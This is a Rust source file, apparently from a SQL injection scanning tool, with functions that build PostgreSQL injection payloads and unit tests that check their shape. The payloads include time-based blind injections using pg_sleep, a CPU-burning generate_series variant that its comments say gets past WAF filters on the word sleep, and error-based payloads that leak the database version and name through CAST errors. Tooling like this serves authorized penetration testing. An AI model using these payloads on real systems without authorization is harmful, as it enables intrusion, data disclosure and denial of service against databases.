#![deny(unsafe_code)]
#[must_use]
pub fn pg_time(secs: u64) -> String {
    format!("'; SELECT pg_sleep({secs}) --")
}

/// Conditional variant: only sleeps when the condition holds.
#[must_use]
pub fn pg_time_conditional(secs: u64) -> String {
    format!("'; SELECT CASE WHEN (1=1) THEN pg_sleep({secs}) ELSE pg_sleep(0) END --")
}

/// Inline concat-breakout variant: no `;` stacked query, breaks out of a
/// string context via `||` concatenation. Wraps `pg_sleep` in
/// `SELECT 1 FROM (SELECT pg_sleep(..))x` to defeat statement optimizers
/// that would skip a bare `SELECT pg_sleep`.
#[must_use]
pub fn pg_time_concat(secs: u64) -> String {
    format!("'||(SELECT 1 FROM (SELECT pg_sleep({secs}))x)||' --")
}

/// Heavy-query variant without any `pg_sleep` keyword (P0-5): WAFs filtering
/// `sleep`/`pg_sleep` pass it through, yet counting a `secs`-scaled
/// `generate_series` burns seconds of CPU on PG 17/18. Always true
/// (`COUNT(*) > 0`), unconditional by design — pair with the conditional
/// `pg_sleep` variant for TRUE/FALSE confirmation.
#[must_use]
pub fn pg_time_heavy(secs: u64) -> String {
    let rows = secs.saturating_mul(500_000).max(500_000);
    format!("' AND (SELECT COUNT(*) FROM generate_series(1,{rows}))>0 --")
}

/// Canonical Postgres error-based set — legacy first (compat), then variant.
///
/// - `[0]` legacy `CAST(version() AS int)` — `invalid input syntax` channel
/// - `[1]` legacy `CAST(current_database() AS int)`
/// - `CAST(chr(126)||version()||chr(126) AS int)` — tilde-delimited exfil
///   variant (`chr()` avoids quoting issues, value surfaces in
///   `invalid input syntax for type integer: "~...~"`).
#[must_use]
pub fn pg_error_payloads() -> Vec<String> {
    vec![
        "' AND CAST((SELECT version()) AS int) --".to_owned(),
        "' AND 1=CAST((SELECT current_database()) AS int) --".to_owned(),
        "' AND 1=CAST((SELECT chr(126)||version()||chr(126)) AS int) --".to_owned(),
    ]
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn legacy_shape() {
        assert_eq!(pg_time(5), "'; SELECT pg_sleep(5) --");
    }

    #[test]
    fn conditional_shape() {
        let p = pg_time_conditional(5);
        assert!(p.contains("CASE WHEN (1=1)"), "{p}");
        assert!(p.contains("pg_sleep(5)"), "{p}");
    }

    #[test]
    fn concat_shape() {
        let p = pg_time_concat(5);
        assert!(p.contains("||"), "{p}");
        assert!(p.contains("pg_sleep(5)"), "{p}");
        assert!(p.contains("FROM (SELECT"), "{p}");
        assert!(p.contains("SELECT 1 FROM (SELECT pg_sleep"), "{p}");
        assert!(p.ends_with(" --"), "{p}");
        assert!(!p.contains(';'), "{p}");
    }

    #[test]
    fn heavy_has_no_sleep_keyword_and_scales() {
        // P0-5: `generate_series` CPU burn passes `sleep`/`pg_sleep`
        // keyword filters; row count scales with `secs`.
        let p = pg_time_heavy(5);
        assert!(p.contains("generate_series(1,2500000)"), "{p}");
        assert!(!p.to_ascii_lowercase().contains("sleep"), "{p}");
        assert!(p.ends_with(" --"), "{p}");
        assert!(!p.ends_with(" -- -"), "{p}");
        let small = pg_time_heavy(1);
        let large = pg_time_heavy(10);
        assert!(small.contains("generate_series(1,500000)"), "{small}");
        assert!(large.contains("generate_series(1,5000000)"), "{large}");
        assert!(
            pg_time_heavy(0).contains("generate_series(1,500000)"),
            "floor"
        );
    }
}
